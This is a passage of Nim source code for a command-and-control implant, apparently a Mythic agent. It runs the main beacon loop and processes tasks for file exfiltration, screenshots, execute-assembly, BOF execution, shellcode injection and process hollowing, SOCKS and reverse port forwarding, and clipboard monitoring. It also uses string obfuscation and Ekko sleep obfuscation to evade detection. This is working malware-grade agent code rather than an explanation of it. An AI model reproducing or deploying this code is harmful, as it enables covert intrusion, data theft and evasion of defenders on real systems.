        for taskResp in respJson[obf("responses")]:
          let taskId = taskResp[obf("task_id")].getStr()
          
          # Check if this response is for a background task
          if agent.backgroundTasks.hasKey(taskId):
            var state = agent.backgroundTasks[taskId]
            
            case state.taskType
            of btDownload:
              # Got file_id, now send chunks
              if state.fileId.len == 0 and taskResp.hasKey(obf("file_id")):
                state.fileId = taskResp[obf("file_id")].getStr()
                agent.backgroundTasks[taskId] = state
                debug "[DEBUG] Download got file_id: ", state.fileId
              
              # Send next chunk
              if state.currentChunk < state.totalChunks:
                state.currentChunk += 1
                
                # Differentiate between file download and screenshot (in-memory data)
                let chunkResp = if state.fileData.len > 0:
                  # Screenshot - process from memory (Windows only)
                  when defined(windows):
                    processScreenshotChunk(taskId, state.fileId, state.fileData, state.currentChunk)
                  else:
                    # Should never happen on non-Windows, but return error
                    %*{obf("task_id"): taskId, obf("completed"): true, obf("status"): "error", obf("user_output"): obf("Screenshot not supported")}
                else:
                  # File download - read from disk
                  processDownloadChunk(taskId, state.fileId, state.path, state.currentChunk)
                
                agent.taskResponses.add(chunkResp)
                
                # Check if this was the last chunk
                if state.currentChunk >= state.totalChunks:
                  let completeMsg = if state.fileData.len > 0:
                    # Screenshot complete (Windows only)
                    when defined(windows):
                      completeScreenshot(taskId, state.fileId)
                    else:
                      %*{obf("task_id"): taskId, obf("completed"): true, obf("status"): "error", obf("user_output"): obf("Screenshot not supported")}
                  else:
                    # File download complete
                    completeDownload(taskId, state.fileId, state.path)
                  
                  agent.taskResponses.add(completeMsg)
                  agent.backgroundTasks.del(taskId)
                  debug "[DEBUG] ", (if state.fileData.len > 0: "Screenshot" else: "Download"), " complete"
                else:
                  agent.backgroundTasks[taskId] = state
            
            of btUpload:
              # Process incoming chunks
              if taskResp.hasKey(obf("chunk_data")):
                let chunkData = taskResp[obf("chunk_data")].getStr()
                let totalChunks = taskResp[obf("total_chunks")].getInt()
                state.totalChunks = totalChunks
                
                let isFirstChunk = (state.currentChunk == 1)
                let uploadResp = processUploadChunk(taskId, state.fileId, state.path, 
                                                     state.currentChunk, chunkData, totalChunks, isFirstChunk)
                agent.taskResponses.add(uploadResp)
                
                if uploadResp.hasKey(obf("completed")) and uploadResp[obf("completed")].getBool():
                  agent.backgroundTasks.del(taskId)
                  debug "[DEBUG] Upload complete"
                else:
                  state.currentChunk += 1
                  agent.backgroundTasks[taskId] = state
            
            of btExecuteAssembly:
              when defined(windows):
                # Process incoming file chunks for execute-assembly
                if taskResp.hasKey(obf("chunk_data")):
                  let chunkData = taskResp[obf("chunk_data")].getStr()
                  let totalChunks = taskResp[obf("total_chunks")].getInt()
                  state.totalChunks = totalChunks
                  
                  # Process the chunk and get next request or final result
                  let execResp = processExecuteAssemblyChunk(
                    taskId, state.params, chunkData, totalChunks, 
                    state.currentChunk, state.fileData
                  )
                  agent.taskResponses.add(execResp)
                  
                  if execResp.hasKey(obf("completed")) and execResp[obf("completed")].getBool():
                    agent.backgroundTasks.del(taskId)
                    debug "[DEBUG] Execute-assembly complete"
                  else:
                    state.currentChunk += 1
                    agent.backgroundTasks[taskId] = state
            
            of btInlineExecute:
              when defined(windows):
                # Process incoming file chunks for inline_execute (BOF)
                if taskResp.hasKey(obf("chunk_data")):
                  let chunkData = taskResp[obf("chunk_data")].getStr()
                  let totalChunks = taskResp[obf("total_chunks")].getInt()
                  state.totalChunks = totalChunks
                  
                  # Process the chunk and get next request or final result
                  let bofResp = processInlineExecuteChunk(
                    taskId, state.params, chunkData, totalChunks,
                    state.currentChunk, state.fileData
                  )
                  agent.taskResponses.add(bofResp)
                  
                  if bofResp.hasKey(obf("completed")) and bofResp[obf("completed")].getBool():
                    agent.backgroundTasks.del(taskId)
                    debug "[DEBUG] Inline_execute complete"
                  else:
                    state.currentChunk += 1
                    agent.backgroundTasks[taskId] = state
            
            of btShinject:
              when defined(windows):
                # Process incoming file chunks for shinject
                if taskResp.hasKey(obf("chunk_data")):
                  let chunkData = taskResp[obf("chunk_data")].getStr()
                  let totalChunks = taskResp[obf("total_chunks")].getInt()
                  state.totalChunks = totalChunks
                  
                  # Process the chunk and get next request or final result
                  let injectResp = processShinjectChunk(
                    taskId, state.params, chunkData, totalChunks,
                    state.currentChunk, state.fileData
                  )
                  agent.taskResponses.add(injectResp)
                  
                  if injectResp.hasKey(obf("completed")) and injectResp[obf("completed")].getBool():
                    agent.backgroundTasks.del(taskId)
                    debug "[DEBUG] Shinject complete"
                  else:
                    state.currentChunk += 1
                    agent.backgroundTasks[taskId] = state
            
            of btDonut:
              when defined(windows):
                # Process incoming file chunks for donut shellcode
                if taskResp.hasKey(obf("chunk_data")):
                  let chunkData = taskResp[obf("chunk_data")].getStr()
                  let totalChunks = taskResp[obf("total_chunks")].getInt()
                  state.totalChunks = totalChunks
                  
                  # Process the chunk and get next request or final result
                  let donutResp = processDonutChunk(
                    taskId, state.params, chunkData, totalChunks, 
                    state.currentChunk, state.fileData
                  )
                  agent.taskResponses.add(donutResp)
                  
                  if donutResp.hasKey(obf("completed")) and donutResp[obf("completed")].getBool():
                    agent.backgroundTasks.del(taskId)
                    debug "[DEBUG] Donut complete"
                  else:
                    state.currentChunk += 1
                    agent.backgroundTasks[taskId] = state
            
            of btInjectHollow:
              when defined(windows):
                # Process incoming file chunks for inject_hollow shellcode
                if taskResp.hasKey(obf("chunk_data")):
                  let chunkData = taskResp[obf("chunk_data")].getStr()
                  let totalChunks = taskResp[obf("total_chunks")].getInt()
                  state.totalChunks = totalChunks
                  
                  # Process the chunk and get next request or final result
                  let injectResp = processInjectHollowChunk(
                    taskId, state.params, chunkData, totalChunks, 
                    state.currentChunk, state.fileData
                  )
                  agent.taskResponses.add(injectResp)
                  
                  if injectResp.hasKey(obf("completed")) and injectResp[obf("completed")].getBool():
                    agent.backgroundTasks.del(taskId)
                    debug "[DEBUG] Inject hollow complete"
                  else:
                    state.currentChunk += 1
                    agent.backgroundTasks[taskId] = state
    except:
      debug "[DEBUG] Failed to parse post_response reply: ", getCurrentExceptionMsg()

proc calculateSleepTime(baseInterval: int, jitterPercent: int): int =
  ## Calculate sleep time with jitter
  ## Works in milliseconds to preserve precision
  if jitterPercent == 0:
    return baseInterval
  
  # Work in milliseconds to avoid integer division precision loss
  let baseMs = baseInterval * 1000
  let jitterMs = rand(-baseMs * jitterPercent .. baseMs * jitterPercent) div 100
  let resultMs = baseMs + jitterMs
  
  # Convert back to seconds
  result = resultMs div 1000
  if result < 1:
    result = 1

proc sleep*(agent: Agent) =
  ## Sleep with jitter
  let sleepTime = calculateSleepTime(agent.sleepInterval, agent.jitter)
  
  debug "[DEBUG] Sleeping for ", sleepTime, " seconds (base: ", agent.sleepInterval, 
         "s, jitter: ", agent.jitter, "%)"
  
  # Use Ekko sleep obfuscation if enabled (only for sleeps > 2 seconds)
  when defined(windows):
    when defined(sleepObfuscationEkko):
      if sleepTime > 2:
        debug "[DEBUG] Using Ekko sleep obfuscation"
        ekkoObf(sleepTime * 1000)
      else:
        debug "[DEBUG] Sleep time < 3s, using regular sleep instead of Ekko"
        os.sleep(sleepTime * 1000)
    else:
      os.sleep(sleepTime * 1000)
  else:
    os.sleep(sleepTime * 1000)

proc runAgent*() =
  ## Main agent execution loop - called by all entry points (EXE, DLL, Service)
  ## This is the single source of truth for the agent's main loop logic
  
  let cfg = getConfig()
  
  debug "[DEBUG] runAgent: Starting agent initialization..."
  
  # Initialize random number generator for jitter
  randomize()
  
  debug "[DEBUG] runAgent: Random seed initialized"
  
  # Check killdate
  let now = now().format("yyyy-MM-dd")
  if now >= cfg.killdate:
    debug "[DEBUG] runAgent: Killdate reached, exiting"
    return
  
  debug "[DEBUG] runAgent: Creating agent instance..."
  
  # Initialize agent
  var agentInstance = newAgent()
  
  debug "[DEBUG] runAgent: Agent instance created, starting checkin..."
  
  # Perform initial checkin
  if not agentInstance.checkin():
    debug "[DEBUG] runAgent: Checkin failed, exiting"
    return
  
  debug "[DEBUG] runAgent: Checkin successful, entering main loop"
  
  # Main agent loop
  while not agentInstance.shouldExit:
    # Get tasking from Mythic (returns tasks, interactive, socks, and rpfwd messages)
    let (tasks, interactive, socksMessages, rpfwdMessages) = agentInstance.getTasks()
    
    # Process interactive messages first (PTY input)
    agentInstance.processInteractive(interactive)
    
    # Process SOCKS messages (data forwarding)
    agentInstance.processSocks(socksMessages)
    
    # Process RPfwd messages (data forwarding)
    agentInstance.processRpfwd(rpfwdMessages)
    
    # Process tasks
    agentInstance.processTasks(tasks)
    
    # Check active PTY sessions for output (non-blocking via threads)
    let ptyResponses = checkActivePtySessions()
    for response in ptyResponses:
      agentInstance.taskResponses.add(response)
    
    # Check active SOCKS connections for data (non-blocking via threads)
    let socksResponses = checkActiveSocksConnections()
    for response in socksResponses:
      agentInstance.taskResponses.add(%*{obf("socks"): [response]})
    
    # Check active RPfwd connections for data (non-blocking via threads)
    let rpfwdResponses = checkActiveRpfwdConnections()
    for response in rpfwdResponses:
      agentInstance.taskResponses.add(%*{obf("rpfwd"): [response]})
    
    # Check background tasks (clipboard_monitor, portscan)
    agentInstance.checkBackgroundTasks()
    
    # Send responses back (handles background task state machine)
    agentInstance.postResponses()
    
    # Sleep with jitter
    agentInstance.sleep()


